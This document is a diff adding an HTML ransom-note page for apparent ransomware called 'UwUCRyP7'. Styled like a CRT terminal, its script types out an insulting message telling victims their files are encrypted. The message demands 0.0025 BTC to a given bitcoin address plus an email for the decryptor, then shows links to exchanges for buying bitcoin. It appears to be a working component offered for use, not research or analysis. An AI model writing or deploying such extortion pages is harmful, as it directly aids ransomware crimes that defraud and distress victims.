@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ransom note</title>
+    
+    <style>
+        :root {
+            --terminal-green: #39ff14; /* Bright neon green */
+            --bg-color: #050505;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background-color: var(--bg-color);
+            color: var(--terminal-green);
+            font-family: 'Courier New', Courier, monospace;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .crt-container {
+            width: 100%;
+            height: 100%;
+            padding: 2rem;
+            box-sizing: border-box;
+            position: relative;
+            z-index: 1;
+            text-shadow: 0 0 5px rgba(57, 255, 20, 0.5);
+            overflow-y: auto;
+        }
+
+        /* Scanlines */
+        .crt-container::before {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 2;
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
+        }
+
+        /* Subtle flicker */
+        .crt-container::after {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.1);
+            opacity: 0;
+            z-index: 2;
+            pointer-events: none;
+            animation: flicker 0.15s infinite;
+        }
+
+        .terminal-text {
+            font-size: 1.5rem;
+            line-height: 1.8;
+            max-width: 800px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 3;
+            word-wrap: break-word;
+        }
+
+        .terminal-text a {
+            color: var(--terminal-green);
+            text-decoration: underline;
+            text-shadow: 0 0 5px rgba(57, 255, 20, 0.5);
+        }
+
+        .terminal-text a:hover {
+            color: #fff;
+            background-color: var(--terminal-green);
+            text-shadow: none;
+        }
+
+        .links-container {
+            margin-top: 2rem;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        @media (max-width: 600px) {
+            .terminal-text {
+                font-size: 1.1rem;
+            }
+        }
+
+        .cursor {
+            display: inline-block;
+            width: 12px;
+            height: 1.2em;
+            background-color: var(--terminal-green);
+            vertical-align: text-bottom;
+            animation: blink 1s step-end infinite;
+            box-shadow: 0 0 8px var(--terminal-green);
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        @keyframes flicker {
+            0% { opacity: 0.02; }
+            50% { opacity: 0.05; }
+            100% { opacity: 0.02; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="crt-container">
+        <div class="terminal-text">
+            <span id="typewriter-output"></span><span class="cursor"></span>
+        </div>
+    </div>
+
+    <script>
+        // Store the main text string
+        const message = `Awwww, did ur shit get encrypted? poor baaby! maybe you'll learn a lesson here 
+
+PAY .0025 BTC TO bc1q2qa86a7j8yy3ktp4k3w6tmth7nkpt07mg5gwtl AND THEN EMAIL DECRYPT@DECRYPTMYSHIT.XYZ FOR DECRYPTOR AND KEY! 
+
+DON'T INSTALL RANDOM BULLSHIT NEXT TIME YOU STUPID FUCK!
+
+— U got pwnd by UwUCRyP7, GIT REKT BOZO`;
+
+        // Store the HTML links separately so they don't break during character-by-character typing
+        const linksHTML = `
+            <div class="links-container">
+                <a href="https://www.coinbase.com" target="_blank">Use Coinbase</a>
+                <a href="https://www.kraken.com" target="_blank">Use Kraken</a>
+                <a href="https://www.binance.us/buy" target="_blank">Use Binance</a>
+                <a href="https://crypto.com" target="_blank">Use Crypto.com</a>
+                <a href="https://coingate.com/buy" target="_blank">Use Coingate</a>
+                <a href="https://www.moonpay.com" target="_blank">Use Moonpay</a>
+                <a href="https://www.bitpay.com/buy-crypto" target="_blank">Use Bitpay</a>
+            </div>
+        `;
+        
+        const outputElement = document.getElementById('typewriter-output');
+        let index = 0;
+        let speed = 70; // Typing speed in ms
+
+        function typeWriter() {
+            if (index < message.length) {
+                // Handle newlines
+                if (message.charAt(index) === '\n') {
+                    outputElement.innerHTML += '<br>';
+                } else {
+                    outputElement.innerHTML += message.charAt(index);
+                }
+                
+                index++;
+                
+                // Add slight randomness to typing speed for realism
+                let currentSpeed = speed + (Math.random() * 30 - 15);
+                
+                // Pause slightly on punctuation
+                if (message.charAt(index - 1) === '.' || message.charAt(index - 1) === '!') {
+                    currentSpeed += 400;
+                }
+
+                setTimeout(typeWriter, currentSpeed);
+            } else {
+                // Append the HTML links instantly once typing finishes
+                outputElement.innerHTML += linksHTML;
+            }
+        }
+
+        // Start typing after a short delay
+        window.onload = () => {
+            setTimeout(typeWriter, 1000);
+        };
+    </script>
+</body>
+</html>
